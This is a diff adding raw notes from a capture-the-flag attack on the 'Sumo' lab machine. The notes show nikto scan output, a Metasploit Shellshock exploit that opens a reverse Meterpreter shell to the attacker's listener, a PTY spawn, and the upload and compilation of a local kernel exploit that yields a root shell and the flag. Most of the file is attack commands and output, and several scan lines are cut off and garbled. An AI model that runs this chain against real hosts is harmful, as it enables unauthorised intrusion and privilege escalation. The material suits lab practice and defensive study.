@@ -1,0 +1,200 @@
+hack@kali:~/CTF/Sumo$ nikto -h 192.168.1.104
+- Nikto v2.1.6
+------------------------------------------------------
++ Target IP:          192.168.1.104
++ Target Hostname:    192.168.1.104
++ Target Port:        80
++ Start Time:         2020-05-18 13:15:56 (GMT2)
+------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Server may leak inodes via ETags, header found with  May 11 19:55:10 2020
++ The anti-clickjacking X-Frame-Options header is not 
++ The X-XSS-Protection header is not defined. This heainst some forms of XSS
++ The X-Content-Type-Options header is not set. This cnt of the site in a different fashion to the MIME type
++ Apache/2.2.22 appears to be outdated (current is at L for the 2.x branch.                                 
++ Uncommon header 'tcn' found, with contents: list    
++ Apache mod_negotiation is enabled with MultiViews, wile names. See http://www.wisec.it/sectou.php?id=4698eex' were found: index.html                            
++ Uncommon header '93e4r0-cve-2014-6278' found, with c
++ OSVDB-112004: /cgi-bin/test: Site appears vulnerablee.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).  
++ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnera/cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD      
++ OSVDB-3092: /cgi-bin/test/test.cgi: This might be in
++ OSVDB-3233: /icons/README: Apache default file found
++ 8725 requests: 0 error(s) and 13 item(s) reported on
++ End Time:           2020-05-18 13:16:20 (GMT2) (24 s
+------------------------------------------------------
++ 1 host(s) tested
+
+
+
+
+Shellshock:
+
+msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env 
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > 
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > show options 
+
+Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CMD        /usr/bin/id      yes       Command to run (absolute paths required)
+   CVE        CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER     User-Agent       yes       HTTP header to use
+   METHOD     GET              yes       HTTP method to use
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                   yes       Path to CGI script
+   THREADS    1                yes       The number of concurrent threads (max one per host)
+   VHOST                       no        HTTP server virtual host
+
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set rhosts 192.168.1.104
+rhosts => 192.168.1.104
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set targeturi /cgi-bin/test
+targeturi => /cgi-bin/test
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run
+
+[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+EXPLOIT:
+
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > 
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > 
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > 
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options 
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT         8080             yes       The local port to listen on.
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI                        yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 192.168.1.104
+rhosts => 192.168.1.104
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test
+targeturi => /cgi-bin/test
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
+
+[*] Started reverse TCP handler on 192.168.1.14:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (980808 bytes) to 192.168.1.104
+[*] Meterpreter session 1 opened (192.168.1.14:4444 -> 192.168.1.104:46600) at 2020-05-18 13:23:05 +0200
+
+meterpreter > getuid
+Server username: no-user @ ubuntu (uid=33, gid=33, euid=33, egid=33)
+meterpreter > 
+
+
+
+User:
+sumo
+
+
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
+
+[*] Started reverse TCP handler on 192.168.1.14:1234 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (980808 bytes) to 192.168.1.104
+[*] Meterpreter session 2 opened (192.168.1.14:1234 -> 192.168.1.104:41700) at 2020-05-18 13:40:33 +0200
+
+meterpreter > 
+meterpreter > 
+meterpreter > 
+meterpreter > ls
+Listing: /usr/lib/cgi-bin
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  73    fil   2020-05-13 20:07:48 +0200  test
+100755/rwxr-xr-x  73    fil   2020-05-11 20:35:21 +0200  test.sh
+
+meterpreter > cd /tmp
+meterpreter > ls
+Listing: /tmp
+=============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100777/rwxrwxrwx  207   fil   2020-05-18 13:40:32 +0200  UuUvb
+
+meterpreter > 
+meterpreter > 
+meterpreter > upload CTF/Sumo/33589.c
+[*] uploading  : CTF/Sumo/33589.c -> 33589.c
+[*] Uploaded -1.00 B of 3.58 KiB (-0.03%): CTF/Sumo/33589.c -> 33589.c
+[*] uploaded   : CTF/Sumo/33589.c -> 33589.c
+meterpreter > 
+meterpreter > 
+meterpreter > shell
+Process 1041 created.
+Channel 2 created.
+python -c "import pty;pty.spawn('/bin/bash')"
+www-data@ubuntu:/tmp$ ls
+ls
+33589.c  UuUvb
+www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o exp 
+gcc 33589.c -O2 -o exp
+www-data@ubuntu:/tmp$ ls
+ls
+33589.c  UuUvb  exp
+www-data@ubuntu:/tmp$ ./exp
+./exp
+exp: 33589.c:73: main: Assertion `argc == 2 && "target?"' failed.
+Aborted
+www-data@ubuntu:/tmp$ ./exp 0
+./exp 0
+IDT addr = 0xffffffff81dd7000
+Using int = 3 with offset = -49063
+root@ubuntu:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:/tmp# cd /root
+cd /root
+root@ubuntu:/root# ls -la
+ls -la
+total 28
+drwx------  3 root root 4096 May 13 11:24 .
+drwxr-xr-x 23 root root 4096 May 11 10:37 ..
+-rw-------  1 root root   22 May 13 11:24 .bash_history
+-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
+drwx------  2 root root 4096 May 11 11:47 .cache
+-rw-r--r--  1 root root  140 Apr 19  2012 .profile
+-rw-r--r--  1 root root   24 May 11 11:47 root.txt
+root@ubuntu:/root# cat root.txt
+cat root.txt
+{Sum0-SunCSR-2020_r001}
+root@ubuntu:/root# 
+
+
+
